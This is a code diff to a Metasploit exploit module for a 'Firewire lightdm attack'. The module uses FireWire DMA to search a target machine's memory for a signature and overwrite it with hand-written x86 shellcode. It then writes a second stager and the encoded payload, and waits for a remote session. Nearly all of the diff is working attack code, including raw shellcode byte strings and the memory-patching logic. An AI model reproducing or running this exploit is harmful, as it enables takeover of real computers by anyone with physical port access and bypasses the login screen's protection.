@@ -12,9 +12,9 @@ class Metasploit3 < Msf::Exploit::Local
 			'Description'    => %q{
                 Firewire lightdm attack.
           	},
-			'Author'         => [ 'albert', 'rory' ],
+			'Author'         => [ 'albert', 'Mr.Breaker' ],
 			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision: 0.11 $',
+			'Version'        => '$Revision: 0.12 $',
 			'References'     =>
 				[
 				],
@@ -47,35 +47,74 @@ class Metasploit3 < Msf::Exploit::Local
 	end
 
 	def exploit
-        forkpatch = "\x50\xb8\x02\x00\x00\x00\xcd\x80\x85\xc0\x74\x02\x58\xc3"
-        prologue= "\x90\x90\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e"
+        stagerpatch = "\xe8\x00\x00\x00\x00\x60\x31\xc0" +
+                      "\xb0\xc0\x31\xdb\x31\xc9\xb5\x10" +
+                      "\x99\xb2\x07\xbe\x22\x00\x00\x00" +
+                      "\xcd\x80\x66\xc7\x00\xff\xe0\xff\xe0" 
+        #forkpatch = "\x50\xb8\x02\x00\x00\x00\xcd\x80\x85\xc0\x74\x02\x58\xc3"
+        #prologue= "\x90\x90\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e"
         # sig = hex2bin(target['Signature'])
         sig = target['Signature']
         # nops = nop_generator.generate_sled(target['Space'] - payload.encoded.length) 
-        patch = prologue + forkpatch + payload.encoded
+        #patch = forkpatch + payload.encoded
         off = target['Offset'] 
 
         # Print phase, method and patch parameters
         puts '        Using signature: %s' % bin2hex(sig)
-        puts '        Using patch:     %s' % bin2hex(patch)
+        puts '        Using patch:     %s' % bin2hex(stagerpatch)
         puts '        Using offset:    %x' % off
 
         # Initialize
         b = Bus.new
-        d = initialize_fw(b, d)
+        d = initialize_fw(b)
          
         # Find memory size
         memsize = 4 * 1024 * 1024  * 1024
-        
+
+        ##
+        # Stage 1 of the attack
+        ##
+
         # Attack
         puts 'Starting attack...'
         begin        
         # Find
             addr = findsig(d, sig, off, memsize)
             if !addr
-                success = false
+                fail('Signature not found.')
+            end
+
+        #    success = true
+            puts 'Signature found at 0x%x.' % addr
+            d.write(addr, stagerpatch)
+            if (d.read(addr, stagerpatch.length) == stagerpatch)
+                puts 'Patch confirmed'
+            end
+
+        rescue IOError => e
+        #    success = false
+            fail( 'I/O Error, make sure FireWire interfaces are properly connected.' + e.message )
+        end
+
+        ##
+        # Stage 2 of the attack
+        ##
+        page = "\x31\xc0\x40\x40\xcd\x80\x85\xc0" +
+               "\x75\x0c\x61\x83\x2c\x24\x05\x83" +
+               "\xc4\x04\xff\x64\x24\xfc"
+        stagesig = "\xff\xe0"  
+        patch = page + payload.encoded
+        # Wait for user input
+        puts 'Press enter if patch on target is run'
+        gets
+        puts 'Searching for payload page'
+        begin        
+        # Find
+            addr = findsig(d, stagesig, 0, memsize)
+            if !addr
+                fail('Signature not found.')
             else
-                success = true
+         #       success = true
                 puts 'Signature found at 0x%x.' % addr
                 d.write(addr, patch)
                 if (d.read(addr, patch.length) == patch)
@@ -83,15 +122,14 @@ class Metasploit3 < Msf::Exploit::Local
                 end
             end 
         rescue IOError => e
-            success = false
+         #   success = false
             puts 'I/O Error, make sure FireWire interfaces are properly connected.'
             puts e.message
         end
 
-        if !success
-            fail('Signature not found.')
-        end
-
+        ##
+        # Stage 3
+        ##
 		print_status "Starting the payload handler..."
 		while(true)
 			break if session_created?
@@ -105,12 +143,12 @@ class Metasploit3 < Msf::Exploit::Local
 
     end
     
-    def initialize_fw(b, d)
+    def initialize_fw(b)
         # Enable SBP-2 support to ensure we get DMA
         b.enable_sbp2()
 
         begin
-            for i in 4.downto(1)
+            for i in 2.downto(1)
                 puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i; 
                 STDOUT.flush
                 sleep(1)
@@ -121,7 +159,6 @@ class Metasploit3 < Msf::Exploit::Local
 
         # Open the first device
         d = b.devices
-       
         if (d.length > 0)
             d = d[0]
             d.open()
@@ -142,20 +179,16 @@ class Metasploit3 < Msf::Exploit::Local
             data = d.read(addr, sig.length)
             # print "Data found %s at %d \r" % [data.unpack('C*').map{ |b| "%02X" % b }.join(), addr]
             # TODO: Fix ugly compare, should be direct compare of bin data and sig 
-            # puts "----"
-            # pp data
-            # pp sig 
             if (data  == sig)
                 return addr
             end
         end
     end          
+
     def fail(msg)
-        puts "\n [!] Attack unsuccessful."
-        puts msg
+        puts "\n [!] Attack unsuccessful." + msg
         exit
     end
-
 
     def hex2bin(s)
         raise "Not a valid hex string" unless(s =~ /^[\da-fA-F]+$/)
